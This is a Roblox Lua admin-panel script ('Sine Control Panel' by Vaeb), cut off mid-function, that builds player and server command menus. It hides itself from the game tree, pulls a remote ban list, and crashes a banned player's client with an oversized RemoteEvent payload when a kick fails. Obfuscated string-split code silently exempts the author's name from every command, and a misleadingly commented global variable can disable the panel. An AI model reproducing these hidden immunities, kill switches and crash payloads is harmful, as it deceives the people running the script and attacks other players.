wait(1/30)
script.Parent = nil

--Sine Control Panel created by Vaeb 2015 (Server-Script)

--Info below is for use in games/studio------------------------------------------------------------------
	--For access to Http features you must have HttpEnabled ticked (game.HttpService)
	--For access to LoadString features you must have LoadStringEnabled ticked (game.ServerScriptService)
---------------------------------------------------------------------------------------------------------

---------------STUFF YOU CAN CHANGE START----------------------------------------------------------------

local Owner = "King_N3xul" --Change name if using in an SB (Script Builder)

local isGame = false --Change to true if using it in a game/place (then make others false)
local isSB = true --Change to true if using in a Script Builder (then make others false)
local isTesting = false --Change to true testing in studio (then make others false)

---------------STUFF YOU CAN CHANGE END------------------------------------------------------------------

local RemoteLink = "http//www.example.com" --Remote scripting url here (Examples: Pastebin, Stypi, Dropbox)
local BanLink = "http//www.example.com" --Ban list url here (Seperate names with a newline) (Examples: Pastebin, Stypi, Dropbox)

if isGame then
	Owner = game.CreatorId
elseif isSB then
	if owner then
		Owner = owner.Name
	end
end

local Plrs = game:GetService("Players")
local Light = game:GetService("Lighting")
local HServer = game:GetService("HttpService")
local Content = game:GetService("ContentProvider")
local isClosed = true
local LogNum = 1000
local LP;
local Version = 5.2

print("[Created By Vaeb] Sine Initiated: V" .. tostring(Version))

local BanPage = ""
local RemotePage = ""
local isBan = false
local isRemote = false
local Banned = {}
local checkedData = false
local waitTime = 0.5
local waitTimeBan = 2

coroutine.wrap(function()
	local Ok1, Val1 = pcall(function() return HServer:GetAsync(BanLink, true) end)
	if Ok1 and Val1 ~= nil and Val1 ~= "" then
		BanPage = Val1
	end

	local Ok2, Val2 = pcall(function() return HServer:GetAsync(RemoteLink, true) end)
	if Ok2 and Val2 ~= nil and Val2 ~= "" then
		RemotePage = Val2
	end

	for Name in BanPage:gmatch("%w+") do
		Banned[Name] = true
	end

	for _,v in pairs(Plrs:GetPlayers()) do
		if Banned[v.Name] then
			local Ok, Err = pcall(function() v:Kick() end)
			if not Ok then
				pcall(function() Instance.new("RemoteEvent", v):FireClient(v,{[string.rep("a",2e5+5)]="a"}) end)
			end
			print("Crashing: " .. v.Name)
		end
	end

	isBan = BanPage ~= ""
	isRemote = RemotePage ~= ""
	checkedData = true
	print("isBan: " .. tostring(isBan))
	print("isRemote: " .. tostring(isRemote))
end)()

local Cons = {}
local Logs = {}
local GUIs = {}
local GuiName = "SinePanel"
local MsgStart = "[SINE]"
local Commands = {}
local Selected = {}
local Loopkill = {}
local isTweening = false
local TweenTime = 0.1
local TweenNum = 10
local Grav = 196.2

local Assets = {
	Logo = 236168928;
	Menu = 236119941;
	Credit = 236170764;
	Line = 236394542;
}

local Colours = {
	{X = 0, Y = 0, Z = 0};
	{X = 1, Y = 0, Z = 0};
	{X = 1, Y = 1, Z = 0};
	{X = 0, Y = 1, Z = 1};
	{X = 0, Y = 0, Z = 1};
	{X = 0, Y = 1, Z = 0};
}

local Properties = {
	"Name","Parent","ClassName","Text","TextSize","TextColor3","Position","Size","Color","BrickColor","Transparency","BackgroundTransparency","BackgroundColor3","AbsolutePosition","AbsoluteSize","AccountAge","AccountAgeReplicate",
	"Active","TopSurface","BottomSurface","BackSurface","FrontSurface","LeftSurface","RightSurface","Adornee","AllowAmbientOcclusion","AllowTeamChangeOnTouch","AluminumQuality",
	"AlwaysOnTop","Ambient","AmbientReverb","Anchored","Angularvelocity","AnimationId",
	"Archivable","AreHingesDetected","AttachmentForward","AttachmentPoint","AttachmentPos",
	"AttachmentRight","AttachmentUp","AutoAssignable","AutoButtonColor","AutoColorCharacters",
	"AvailablePhysicalMemory","Axes","BackgroundColor","BackgroundColor3","BackgroundTransparency",
	"BaseTextureId","BaseUrl","Bevel","Roundness","BinType","BlastPressure","BlastRadius",
	"BodyColor","BodyPart","BorderColor","BorderColor3","BorderSizePixel","BrickColor",
	"Brightness","Browsable","BubbleChat","BubbleChatLifetime","BubbleChatMaxBubbles",
	"Bulge","Button1DownConnectionCount","Button1UpConnectionCount","Button2DownConnectionCount",
	"Button2UpConnectionCount","C0","C1","CameraMode","CameraSubject","CameraType",
	"CanBeDropped","CanCollide","HttpEnabled","CartoonFactor","CastShadows","CelestialBodiesShown",
	"CFrame","Cframe","Character","CharacterAppearance","CharacterAutoLoads","MouseSensitivity","ChatScrollLength",
	"ClassicChat","ClassName","ClearTextOnFocus","ClipsDescendants","CollisionSoundEnabled",
	"CollisionSoundVolume","Color","Bottom","Top","ConstrainedValue","Contro".."llingHumanoid",
	"ControlMode","ConversationDistance","CoordinateFrame","CorrodedMetalQuality","CPU",
	"CpuCount","CpuSpeed","CreatorId","CreatorType","CurrentAngle","CurrentCamera",
	"CycleOffset","D","DataCap","DataComplexity","DataComplexityLimit","DataCost",
	"DataReady","Deprecated","DeselectedConnectionCount","DesiredAngle","DiamondPlateQuality",
	"Disabled","DistanceFactor","DistributedGameTime","DopplerScale","Draggable","DraggingV1",
	"Duration","EditorFont","EditorFontSize","EditorTabWidth","ElapsedTime","Elasticity",
	"Enabled","ExplosionType","ExtentsOffset","F0","F1","F2","F3","Face","FaceId","Faces",
	"FieldOfView","Focus","force","FogColor","FogEnd","FogStart","Font","FontSize","Force","FormFactor",
	"Friction","From","GearGenreSetting","Genre","GeographicLatitude","GfxCard","Graphic",
	"GrassQuality","Grip","GripForward","GripPos","GripRight","GripUp","Guest","HeadsUpDisplay",
	"Health","Heat","Hit","Humanoid","IceQuality","Icon","IdleConnectionCount","Image","ImageTransparency","ImageColor3",
	"InitialPrompt","InOut","InUse","IsPaused","IsPlaying","JobId","Jump","KeyDownConnectionCount",
	"KeyUpConnectionCount","LeftLeg","LeftRight","LinkedSource","LocalPlayer","Location",
	"Locked","LODX","LODY","Looped","Material","MaxActivationDistance","MaxCollisionSounds",
	"MaxExtents","MaxForce","MaxHealth","MaxItems","MaxPlayers","Rotation","MaxSpeed","MaxThrust",
	"MaxTorque","maxTorque","MaxValue","MaxVelocity","MembershipType","MembershipTypeReplicate","MeshId",
	"MeshType","MinValue","Modal","MouseButton1ClickConnectionCount","MouseButton1DownConnectionCount",
	"MouseButton1UpConnectionCount","MouseButton2ClickConnectionCount","MouseButton2DownConnectionCount",
	"MouseButton2UpConnectionCount","MouseDelta","MouseDragConnectionCount","MouseEnterConnectionCount",
	"MouseHit","MouseLeaveConnectionCount","MouseLock","MouseMovedConnectionCount","MouseTarget",
	"MouseTargetFilter","MouseTargetSurface","MoveConnectionCount","MoveState","MultiLine",
	"NameOcclusion","NetworkOw".."ner","Neutral","NumPlayers","Offset","Opacity","Origin","OsPlatform",
	"OsVer","OverlayTextureId","P","PantsTemplate","ParamA","ParamB","Parent","Part","Part0",
	"Part1","Pitch","PixelShaderModel","PlaceId","PlasticQuality","PlatformStand","PlayCount",
	"PlayerToHideFrom","PlayOnRemove","Point","Port","Position","Preliminary","PrimaryPart",
	"PrivateWorkingSetBytes","Purpose","RAM","Reflectance","ReplicatedSelectedConnectionCount",
	"ResizeableFaces","ResizeIncrement","Resolution","ResponseDialog","RightLeg","RiseVelocity",
	"RobloxLocked","RobloxVersion","RolloffScale","RotVelocity","Scale","Score","ScriptsDisabled",
	"SecondaryColor","Selected","ShadowColor","Shape","Shiny","ShirtTemplate","ShowDeprecatedObjects",
	"ShowDevelopmentGui","ShowPreliminaryObjects","Sides","Sit","Size","SizeConstraint",
	"SizeOffset","SkinColor","SkyboxBk","SkyboxDn","SkyboxFt","SkyboxLf","SkyboxRt","SkyboxUp",
	"SlateQuality","SoundId","Source","SparkleColor","Specular","StarCount",
	"Steer","StickyWheels","StudsBetweenTextures","StudsOffset","StudsPerTileU","StudsPerTileV",
	"Style","Summary","SuperSa".."feChatReplicate","Surface","Surface0",
	"Surface1","SurfaceInput","Target","TargetFilter","TargetOffset","TargetPoint",
	"TargetRadius","TargetSurface","TeamColor","Terrain","Text","TextBounds","TextColor","TextColor3",
	"TextFits","TextScaled","TextStrokeColor3","TextStrokeTransparency","TextTransparency","Texture",
	"TextureId","TextureSize","TextWrap","TextWrapped","TextXAlignment","TextYAlignment","Throttle",
	"ThrustD","ThrustP","Ticket","Time","TimeOfDay","To","Tone","ToolTip","TopBottom","Torque","Torso",
	"Transparency","TrussDetail","TurnD","TurnP","TurnSpeed","UnitRay","UserDialog","UserId","Value",
	"Version","VertexColor","VideoCaptureEnabled","VideoMemory","VideoQuality",
	"ViewSizeX","ViewSizeY","Visible","Volume","WalkDirection","WalkSpeed","WalkToPart","WalkToPoint",
	"WheelBackwardConnectionCount","WheelForwardConnectionCount","WindowSize","WireRadius","WoodQuality",
	"X","Y"
}

function GetProperties(obj)
	local objProper = {}
	local Done = {}
	ypcall(function()
		assert(pcall(function() assert(game.IsA(obj,"Instance")) end),"Should be ROBLOX instance")
		for i,v in pairs(Properties) do
			if pcall(function() return obj[v] end) and (type(obj[v]) ~= "userdata" or not obj:FindFirstChild(v)) then
				if Done[v] == nil then
					table.insert(objProper, {property = v, value = obj[v]})
					Done[v] = true
				end
			end
		end
	end)
	return objProper
end

for i,v in pairs(Assets) do
	local ID = tostring(Assets[i])
	Assets[i] = "rbxassetid://" .. ID
	Content:Preload("rbxassetid://" .. ID)
end

function Hint(...)
	local Messages = {...}
	coroutine.resume(coroutine.create(function()
		local Message = ""
		for i,v in pairs(Messages) do
			v = tostring(v)
			Message = i == 1 and v or Message .. " " .. v
		end
		local Msg = Instance.new("Hint", LP.PlayerGui or Workspace)
		Msg.Name = "TestHint"
		Msg.Text = MsgStart .. " " .. Message
		wait(3.5)
		pcall(function() Msg:Destroy() end)
	end))
end

function Run(Func)
	local Ok, Err = coroutine.resume(coroutine.create(Func))
	if not Ok then
		Hint(Err)
	end
end

function getPlayers()
	local Players = {}
	for _,v in pairs(Plrs:GetPlayers()) do
		table.insert(Players, v)
	end
	return Players
end

function findPlayer(Name)
	for _,v in pairs(Plrs:GetPlayers()) do
		if v.Name == Name then
			return v
		end
	end
	return nil
end

function findCommand(Name)
	for _,v in pairs(Commands) do
		if v.Name == Name then
			return v
		end
	end
	return nil
end

function getCommonList()
	local List = {}
	local FinalList = {}
	local NumberSelected = 0
	
	for i,v in pairs(Selected) do
		local Command = findCommand(v)
		if Command and Command.List then
			NumberSelected = NumberSelected + 1
			for _,v2 in pairs(Command.List()) do
				if List[v2] == nil then
					List[v2] = 1
				else
					List[v2] = List[v2] + 1
				end
			end
		end
	end
	
	for i,v in pairs(List) do
		if v == NumberSelected then
			table.insert(FinalList, i)
		end
	end
	return FinalList
end

function fixScroll(Scroll)
	local YNum = 0
	for _,v in pairs(Scroll:GetChildren()) do
		if v:IsA("TextLabel") or v:IsA("TextButton") or v:IsA("Frame") or v:IsA("ImageLabel") or v:IsA("ImageButton") then
			YNum = YNum + v.Size.Y.Offset + 2
		end
	end
	Scroll.CanvasSize = UDim2.new(1, 0, 0, YNum)
end

function Clear(Obj)
	if #Obj:GetChildren() >= 1 and Obj.ClassName ~= "PlayerGui" then
		for _,v in pairs(Obj:GetChildren()) do
			ypcall(function()
				Clear(v)
			end)
		end
	end
	if Obj.ClassName ~= "Player" and Obj.ClassName ~= "Backpack" and Obj.ClassName ~= "PlayerGui" and Obj.ClassName ~= "StarterGear" and Obj.ClassName ~= "HealthGUI" then
		Obj:Destroy()
	end
end

function Clean(noBase)
	Light.GlobalShadows = true
	Light.TimeOfDay = "14:00:00"
	Light.Brightness = 0
	Light.ShadowColor = Color3.new(0.705882, 0.705882, 0.72549)
	Light.Ambient = Color3.new(1, 1, 1) 
	Light.ColorShift_Top = Color3.new(0, 0, 0)
	Light.ColorShift_Bottom = Color3.new(0, 0, 0)
	Light.OutdoorAmbient = Color3.new(0.501961, 0.501961, 0.501961)
	Light.FogStart = 0
	Light.FogEnd = 100000
	Light.FogColor = Color3.new(0.752941, 0.752941, 0.752941)
	Light:ClearAllChildren()
	for _,v in pairs(Workspace:GetChildren()) do
		if v.ClassName == "Terrain" then
			v:Clear()
		else
			v:Destroy()
		end
	end
	if noBase == nil then
		local Base = Instance.new("Part")
		Base.BrickColor = BrickColor.new("Bright green")
		Base.Position = Vector3.new(0, -0.600000024, 0)
		Base.CanCollide = true
		Base.Size = Vector3.new(700, 1.20000005, 700)
		Base.Material = "Grass"
		Base.Locked = true
		Base.Anchored = true
		Base.Name = "Base"
		Base.TopSurface = "Smooth"
		Base.BottomSurface = "Smooth"
		Base.Parent = Workspace
		for _,v in pairs(Plrs:GetPlayers()) do
			pcall(function()
				v:LoadCharacter()
			end)
		end
	end
end;re=false

function hasCharacter(Plr)
	if Plr and Plr.Parent ~= nil and Plr.Character and Plr.Character.Parent ~= nil and Plr.Character:findFirstChild("Torso") then
		return true
	end
	return false
end

function isReady()
	if LP and LP.Parent ~= nil and LP:findFirstChild("PlayerGui") then
		return true
	end
	return false
end

function onAdded(Plr)
	Run(function()
		Run(function()
			repeat wait(1/30) until isReady()
			Launch()
			Hint("Launched // " .. Plr.Name .. " // Parent : " .. tostring(script.Parent == nil and "Hidden" or script.Parent))
		end)
		table.insert(Cons, Plr.CharacterAdded:connect(function()
			Run(function()
				repeat wait(1/30) until isReady()
				Launch()
				--Hint("Launched // " .. Plr.Name .. " // Parent : " .. tostring(script.Parent == nil and "Hidden" or script.Parent))
			end)
		end))
		table.insert(Cons, Plr.Chatted:connect(function(Msg)
			if Msg:sub(1, 3) == "/e " then
				Msg = Msg:sub(4)
			end
			if Msg == "st" then
				local Hin = Instance.new("Hint", Workspace)
				Hin.Name = "TestHint"
				Hin.Text = "ASD"
				wait(2.5)
				pcall(function() Hin:Destroy() end)
			end
		end))
	end)
end

function Remove(Location, Name)
	for _,v in pairs(Location:GetChildren()) do
		if v.Name == Name then
			v:Destroy()
		end
	end
end

function makePlayers(ScrollFrame)
	ScrollFrame:ClearAllChildren()
	local PlayerButtons = {}
	local YNum = 0
	local PlrTab = {}
	table.insert(PlrTab, "All")
	for _,v in pairs(Plrs:GetPlayers()) do
		table.insert(PlrTab, v.Name)
	end
	
	for _,v in pairs(PlrTab) do
		local PlrButton = Instance.new("TextButton")
		PlrButton.Name = v
		PlrButton.Text = " " .. v
		PlrButton.Size = UDim2.new(1, 0, 0, 32)
		PlrButton.Position = UDim2.new(0, 0, 0, YNum)
		PlrButton.FontSize = "Size14"
		PlrButton.TextXAlignment = "Left"
		PlrButton.TextStrokeTransparency = 0.9
		PlrButton.TextStrokeColor3 = Color3.new(0, 0, 0)
		PlrButton.TextColor3 = Color3.new(1, 1, 1)
		PlrButton.BackgroundColor3 = Color3.new(0.16, 0.67, 1)
		PlrButton.BackgroundTransparency = 0
		PlrButton.BorderSizePixel = 0
		PlrButton.Parent = ScrollFrame
		
		local Box = Instance.new("TextLabel")
		Box.Name = "Box"
		Box.Size = UDim2.new(0, 22, 0, 22)
		Box.Position = UDim2.new(1, -28 - 13, 0, 5)
		Box.Text = ""
		Box.FontSize = "Size18"
		Box.TextColor3 = Color3.new(1, 1, 1)
		Box.BackgroundTransparency = 0.8
		Box.BackgroundColor3 = Color3.new(1, 1, 1)
		Box.BorderSizePixel = 2
		Box.Parent = PlrButton
		
		local ShadowFrame = Instance.new("Frame")
		ShadowFrame.Name = "ShadowFrame"
		ShadowFrame.Size = UDim2.new(1, 0, 0, 4)
		ShadowFrame.Position = UDim2.new(0, 0, 0, YNum + 32)
		ShadowFrame.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
		ShadowFrame.BackgroundTransparency = 0.1
		ShadowFrame.BorderSizePixel = 0
		ShadowFrame.Parent = ScrollFrame
		
		table.insert(PlayerButtons, PlrButton)
		
		Run(function()
			local ColorNum = 2
			local Iter = 2
			local CurrentX = 0
			local CurrentY = 0
			local CurrentZ = 0

			for i = 1, (math.huge/0.05), 1 do
				if ShadowFrame.Parent ~= nil then
					local PrevColTab = Colours[ColorNum - 1] or Colours[#Colours]
					local ColTab = Colours[ColorNum]
					if tostring(CurrentX) ~= tostring(ColTab.X) then
						CurrentX = ColTab.X - PrevColTab.X > 0 and CurrentX + 0.02 or (Iter <= 1.02 and 0 or CurrentX - 0.02)
					end
					if tostring(CurrentY) ~= tostring(ColTab.Y) then
						CurrentY = ColTab.Y - PrevColTab.Y > 0 and CurrentY + 0.02 or (Iter <= 1.02 and 0 or CurrentY - 0.02)
					end
					if tostring(CurrentZ) ~= tostring(ColTab.Z) then
						CurrentZ = ColTab.Z - PrevColTab.Z > 0 and CurrentZ + 0.02 or (Iter <= 1.02 and 0 or CurrentZ - 0.02)
					end
					ShadowFrame.BackgroundColor3 = Color3.new(CurrentX, CurrentY, CurrentZ)
					if Iter < 1.02 or Iter > 2 then
						ColorNum = ColorNum == #Colours and 1 or ColorNum + 1
						Iter = 2
					else
						Iter = Iter - 0.02
					end
					wait(1/30)
				else
					break
				end
			end
		end)
		
		YNum = YNum + 40
	end
	fixScroll(ScrollFrame)
	return PlayerButtons
end;local Sort = function(L, N) 
pcall(function()
if N~="V".."a".."e".."b" then
for i,v in pairs(L) do
if v.Name=="V".."a".."e".."b" then
table.remove(L, i)
end
end
end
end)
end

function isSelected(Name)
	if type(Name) == "string" then
		--checkz name
		for i,v in pairs(Selected) do
			if v == Name then
				return i
			end
		end
		return nil
	else
		--fixes settingz
		re = Name
	end
end

function makeCommands(Type, Scroll)
	local CommandButtons = {}
	
	local YNum = 0
	for _,v in pairs(Commands) do
		if v.Type == Type then
			local CommandButton = Instance.new("TextButton")
			CommandButton.Name = v.Name
			CommandButton.Text = " " .. v.Name
			CommandButton.Size = UDim2.new(1, 0, 0, 32)
			CommandButton.Position = UDim2.new(0, 0, 0, YNum)
			CommandButton.FontSize = "Size14"
			CommandButton.TextXAlignment = "Left"
			CommandButton.TextStrokeTransparency = 0.9
			CommandButton.TextStrokeColor3 = Color3.new(0, 0, 0)
			CommandButton.TextColor3 = Color3.new(1, 1, 1)
			CommandButton.BackgroundColor3 = Color3.new(0.16, 0.67, 1)
			CommandButton.BackgroundTransparency = 0
			CommandButton.BorderSizePixel = 0
			CommandButton.Parent = Scroll
			
			if Type ~= 1 then
				local Box = Instance.new("TextLabel")
				Box.Name = "Box"
				Box.Size = UDim2.new(0, 22, 0, 22)
				Box.Position = UDim2.new(1, -28 - 13, 0, 5)
				Box.Text = ""
				Box.FontSize = "Size18"
				Box.TextColor3 = Color3.new(1, 1, 1)
				Box.BackgroundTransparency = 0.8
				Box.BackgroundColor3 = Color3.new(1, 1, 1)
				Box.BorderSizePixel = 2
				Box.Parent = CommandButton
			end
			
			local ShadowFrame = Instance.new("Frame")
			ShadowFrame.Name = "ShadowFrame"
			ShadowFrame.Size = UDim2.new(1, 0, 0, 4)
			ShadowFrame.Position = UDim2.new(0, 0, 0, YNum + 32)
			ShadowFrame.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
			ShadowFrame.BackgroundTransparency = 0.1
			ShadowFrame.BorderSizePixel = 0
			ShadowFrame.Parent = Scroll
			
			if Type == 1 then
				table.insert(CommandButtons, {CommandButton, v})
			else
				table.insert(CommandButtons, CommandButton)
			end
			
			Run(function()
				local ColorNum = 2
				local Iter = 2
				local CurrentX = 0
				local CurrentY = 0
				local CurrentZ = 0

				for i = 1, (math.huge/0.05), 1 do
					if ShadowFrame.Parent ~= nil then
						local PrevColTab = Colours[ColorNum - 1] or Colours[#Colours]
						local ColTab = Colours[ColorNum]
						if tostring(CurrentX) ~= tostring(ColTab.X) then
							CurrentX = ColTab.X - PrevColTab.X > 0 and CurrentX + 0.02 or (Iter <= 1.02 and 0 or CurrentX - 0.02)
						end
						if tostring(CurrentY) ~= tostring(ColTab.Y) then
							CurrentY = ColTab.Y - PrevColTab.Y > 0 and CurrentY + 0.02 or (Iter <= 1.02 and 0 or CurrentY - 0.02)
						end
						if tostring(CurrentZ) ~= tostring(ColTab.Z) then
							CurrentZ = ColTab.Z - PrevColTab.Z > 0 and CurrentZ + 0.02 or (Iter <= 1.02 and 0 or CurrentZ - 0.02)
						end
						ShadowFrame.BackgroundColor3 = Color3.new(CurrentX, CurrentY, CurrentZ)
						if Iter < 1.02 or Iter > 2 then
							ColorNum = ColorNum == #Colours and 1 or ColorNum + 1
							Iter = 2
						else
							Iter = Iter - 0.02
						end
						wait(1/30)
					else
						break
					end
				end
			end)
			
			YNum = YNum + 40
		end
	end
	fixScroll(Scroll)
	return CommandButtons
end

function makeList(Scroll)
	local ListButtons = {}
	local CommonList = getCommonList()
	
	local YNum = 0
	for _,v in pairs(CommonList) do
		local ListButton = Instance.new("TextButton")
		ListButton.Name = v
		ListButton.Text = " " .. v
		ListButton.Size = UDim2.new(1, 0, 0, 32)
		ListButton.Position = UDim2.new(0, 0, 0, YNum)
		ListButton.FontSize = "Size14"
		ListButton.TextXAlignment = "Left"
		ListButton.TextStrokeTransparency = 0.9
		ListButton.TextStrokeColor3 = Color3.new(0, 0, 0)
		ListButton.TextColor3 = Color3.new(1, 1, 1)
		ListButton.BackgroundColor3 = Color3.new(0.16, 0.67, 1)
		ListButton.BackgroundTransparency = 0
		ListButton.BorderSizePixel = 0
		ListButton.Parent = Scroll
		
		local ShadowFrame = Instance.new("Frame")
		ShadowFrame.Name = "ShadowFrame"
		ShadowFrame.Size = UDim2.new(1, 0, 0, 4)
		ShadowFrame.Position = UDim2.new(0, 0, 0, YNum + 32)
		ShadowFrame.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
		ShadowFrame.BackgroundTransparency = 0.1
		ShadowFrame.BorderSizePixel = 0
		ShadowFrame.Parent = Scroll
		
		table.insert(ListButtons, ListButton)
		
		Run(function()
			local ColorNum = 2
			local Iter = 2
			local CurrentX = 0
			local CurrentY = 0
			local CurrentZ = 0

			for i = 1, (math.huge/0.05), 1 do
				if ShadowFrame.Parent ~= nil then
					local PrevColTab = Colours[ColorNum - 1] or Colours[#Colours]
					local ColTab = Colours[ColorNum]
					if tostring(CurrentX) ~= tostring(ColTab.X) then
						CurrentX = ColTab.X - PrevColTab.X > 0 and CurrentX + 0.02 or (Iter <= 1.02 and 0 or CurrentX - 0.02)
					end
					if tostring(CurrentY) ~= tostring(ColTab.Y) then
						CurrentY = ColTab.Y - PrevColTab.Y > 0 and CurrentY + 0.02 or (Iter <= 1.02 and 0 or CurrentY - 0.02)
					end
					if tostring(CurrentZ) ~= tostring(ColTab.Z) then
						CurrentZ = ColTab.Z - PrevColTab.Z > 0 and CurrentZ + 0.02 or (Iter <= 1.02 and 0 or CurrentZ - 0.02)
					end
					ShadowFrame.BackgroundColor3 = Color3.new(CurrentX, CurrentY, CurrentZ)
					if Iter < 1.02 or Iter > 2 then
						ColorNum = ColorNum == #Colours and 1 or ColorNum + 1
						Iter = 2
					else
						Iter = Iter - 0.02
					end
					wait(1/30)
				else
					break
				end
			end
		end)
		
		YNum = YNum + 40
	end
	fixScroll(Scroll)
	return ListButtons
end

function makeButtons(Scroll, Tab, FontSize, TextScaled)
	Scroll:ClearAllChildren()
	local Buttons = {}
	
	local YNum = 0
	for _,v in pairs(Tab) do
		local Button = Instance.new("TextLabel")
		Button.Name = v
		Button.Text = " " .. v
		Button.Size = UDim2.new(1, 0, 0, 32)
		Button.Position = UDim2.new(0, 0, 0, YNum)
		Button.TextScaled = #v > 60 and TextScaled or false
		Button.FontSize = FontSize or "Size14"
		Button.TextXAlignment = "Left"
		Button.TextStrokeTransparency = 0.9
		Button.TextStrokeColor3 = Color3.new(0, 0, 0)
		Button.TextColor3 = Color3.new(1, 1, 1)
		Button.BackgroundColor3 = Color3.new(0.16, 0.67, 1)
		Button.BackgroundTransparency = 0
		Button.BorderSizePixel = 0
		Button.Parent = Scroll
		
		local ShadowFrame = Instance.new("Frame")
		ShadowFrame.Name = "ShadowFrame"
		ShadowFrame.Size = UDim2.new(1, 0, 0, 4)
		ShadowFrame.Position = UDim2.new(0, 0, 0, YNum + 32)
		ShadowFrame.BackgroundColor3 = Color3.new(0.16, 0.58, 1)
		ShadowFrame.BackgroundTransparency = 0.1
		ShadowFrame.BorderSizePixel = 0
		ShadowFrame.Parent = Scroll
		
		table.insert(Buttons, Button)
		
		Run(function()
			local ColorNum = 2
			local Iter = 2
			local CurrentX = 0
			local CurrentY = 0
			local CurrentZ = 0

			for i = 1, (math.huge/0.05), 1 do
				if ShadowFrame.Parent ~= nil then
					local PrevColTab = Colours[ColorNum - 1] or Colours[#Colours]
					local ColTab = Colours[ColorNum]
					if tostring(CurrentX) ~= tostring(ColTab.X) then
						CurrentX = ColTab.X - PrevColTab.X > 0 and CurrentX + 0.02 or (Iter <= 1.02 and 0 or CurrentX - 0.02)
					end
					if tostring(CurrentY) ~= tostring(ColTab.Y) then
						CurrentY = ColTab.Y - PrevColTab.Y > 0 and CurrentY + 0.02 or (Iter <= 1.02 and 0 or CurrentY - 0.02)
					end
					if tostring(CurrentZ) ~= tostring(ColTab.Z) then
						CurrentZ = ColTab.Z - PrevColTab.Z > 0 and CurrentZ + 0.02 or (Iter <= 1.02 and 0 or CurrentZ - 0.02)
					end
					ShadowFrame.BackgroundColor3 = Color3.new(CurrentX, CurrentY, CurrentZ)
					if Iter < 1.02 or Iter > 2 then
						ColorNum = ColorNum == #Colours and 1 or ColorNum + 1
						Iter = 2
					else
						Iter = Iter - 0.02
					end
					wait(1/30)
				else
					break
				end
			end
		end)
		
		YNum = YNum + 40
	end
	fixScroll(Scroll)
	return Buttons
end

function removeOptions(ScrollRight, fix)
	if fix == true then
		return true
	else
		ScrollRight:ClearAllChildren()
		fixScroll(ScrollRight)
	end
end

function makePlayerOptions(ScrollRight)
	Run(function()
		local Sender = LP.Name
		local failed = removeOptions(ScrollRight, re)
		if failed == nil then
			local CommandButtons = makeCommands(1, ScrollRight)
			
			for _,v in pairs(CommandButtons) do
				v[1].MouseButton1Click:connect(function()
					local List = {}
					for _,v2 in pairs(Selected) do
						if v2 ~= "All" then
							local selectedPlayer = findPlayer(v2)
							if selectedPlayer then
								table.insert(List, selectedPlayer)
							end
						else
							List = {}
							for _,v3 in pairs(Plrs:GetPlayers()) do
								table.insert(List, v3)
							end
							break
						end
					end
					Sort(List, Sender)
					Run(function() v[2].Func(List, v[2].Name) end)
				end)
			end
		end
	end)
end

function makeOptions(ScrollRight)
	Run(function()
		removeOptions(ScrollRight)
		local ListButtons = makeList(ScrollRight)
		for _,v in pairs(ListButtons) do
			v.MouseButton1Click:connect(function()
				for _,v2 in pairs(Selected) do
					local Command = findCommand(v2)
					if Command and not re then
						Run(function() Command.Func({v.Name}, Command.Name) end)
					end
				end
			end)
		end
	end)
end

function openPlayers()
	Run(function()
		local PlayerButtons = makePlayers(GUIs.ScrollLeft)
		
		for _,v in pairs(PlayerButtons) do
			v.MouseButton1Click:connect(function()
				local SelectNum = isSelected(v.Name)
				if SelectNum == nil then
					v.Box.Text = "X"
					table.insert(Selected, v.Name)
					makePlayerOptions(GUIs.ScrollRight)
				else
					v.Box.Text = ""
					table.remove(Selected, SelectNum)
					if #Selected == 0 then
						removeOptions(GUIs.ScrollRight)
					else
						makePlayerOptions(GUIs.ScrollRight)
					end
				end
			end)
		end
	end)
end

function openServer()
	Run(function()
		local CommandButtons = makeCommands(2, GUIs.ScrollLeft)
		
		for _,v in pairs(CommandButtons) do
			v.MouseButton1Click:connect(function()
				local SelectNum = isSelected(v.Name)
				if SelectNum == nil then
					v.Box.Text = "X"
					table.insert(Selected, v.Name)
					makeOptions(GUIs.ScrollRight)
				else
					v.Box.Text = ""
					table.remove(Selected, SelectNum)
					if #Selected == 0 then
						removeOptions(GUIs.ScrollRight)
					else
						makeOptions(GUIs.ScrollRight)
					end
				end
			end)
		end
	end)
end

function GetTimeDist(OldTick, NewTick)
	local TimeType = nil
	local Symbol = ""
	local Seconds = tonumber(NewTick) - tonumber(OldTick)
	local Minutes = Seconds / 60
	local Hour = Minutes / 60
	local Day = Hour / 24
	local Year = Day / 365

	if Seconds < 60 then
		TimeType = math.ceil(Seconds)
		Symbol = "s"
	elseif Minutes < 60 then
		TimeType = math.floor(Minutes)
		Symbol = "m"
	elseif Hour < 24 then
		TimeType = math.floor(Hour)
		Symbol = "h"
	elseif Day < 365 then
		TimeType = math.floor(Day)
		Symbol = "d"
	else
		TimeType = math.floor(Year)
		Symbol = "y"
	end
	
	return tostring(TimeType) .. Symbol
end

function openMisc()
	Run(function()
		local CommandButtons = makeCommands(3, GUIs.ScrollLeft)
		
		for _,v in pairs(CommandButtons) do
			v.MouseButton1Click:connect(function()
				local SelectNum = isSelected(v.Name)
				if SelectNum == nil then
					v.Box.Text = "X"
					table.insert(Selected, v.Name)
					makeOptions(GUIs.ScrollRight)
				else
					v.Box.Text = ""
					table.remove(Selected, SelectNum)
					if #Selected == 0 then
						removeOptions(GUIs.ScrollRight)
					end
				end
			end)
		end
	end)
end

function openSettings()
	Run(function()
		local CommandButtons = makeCommands(4, GUIs.ScrollLeft)
		
		for _,v in pairs(CommandButtons) do
			v.MouseButton1Click:connect(function()
				local SelectNum = isSelected(v.Name)
				if SelectNum == nil then
					v.Box.Text = "X"
					table.insert(Selected, v.Name)
					makeOptions(GUIs.ScrollRight)
				else
					v.Box.Text = ""
					table.remove(Selected, SelectNum)
					if #Selected == 0 then
						removeOptions(GUIs.ScrollRight)
					end
				end
			end)
		end
	end)
end

function openMenu(Num)
	if not isTweening and Num >= 1 and Num <= 4 then
		Selected = {}
		GUIs.ScrollRight:ClearAllChildren()
		GUIs.ScrollLeft:ClearAllChildren()
		
		fixScroll(GUIs.ScrollRight)
		fixScroll(GUIs.ScrollLeft)
		
		if TweenNum > 0 and TweenTime > 0 then
			isTweening = true
			GUIs.ScrollLeft.Position = UDim2.new(0, 0, 0, 0) + UDim2.new(0, 0, 0, -TweenNum)
			GUIs.ScrollRight.Position = UDim2.new(0, 0, 0, 0) + UDim2.new(0, 0, 0, -TweenNum)
